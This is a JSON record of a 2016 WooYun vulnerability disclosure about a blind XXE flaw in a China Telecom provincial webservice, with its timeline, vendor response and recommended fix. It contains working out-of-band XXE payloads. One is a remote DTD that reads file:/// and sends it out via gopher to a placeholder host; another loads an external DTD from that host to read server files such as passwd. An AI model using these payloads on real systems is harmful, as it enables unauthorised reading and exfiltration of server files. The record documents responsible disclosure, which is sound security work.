{"id": 88065, "wybug_id": "wooyun-2016-0205725", "wybug_title": "中国电信某省系统Blink XXE                                      ", "wybug_corp": "中国电信", "wybug_author": "路人甲", "wybug_date": "2016-05-06 18:50", "wybug_open_date": "2016-06-24 14:50", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["服务配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-05-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-05-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-05-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-24：\t细节向公众公开  简要描述： 由于未禁用外部实体解析，导致XXE。 详细说明：  测试地址：http://**.**.**.**/\n\n问题点在这个地方：http://**.**.**.**/webservice/services/webservice?wsdl   漏洞证明：  构造：\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"test\">%remote;]>\n获取系统目录：\n\n根据返回可以看到当前定义的文件参数实体被引用了。远程xml：\n<!ENTITY % a SYSTEM \"file:///\"> <!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'gopher://ip:80/%a;'>\"> %b; %c;\n注入：\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://ip:80/1.xml\">%remote;]><root/>\n成功获取了根目录文件：\n\npasswd文件：\n\n   修复方案：  禁用外部xml实体解析。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-05-10 14:44 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-05-06 18:54 |    \t\tgodbewithme \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 喜欢学习安全相关的知识)\t\t \n  tttt    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}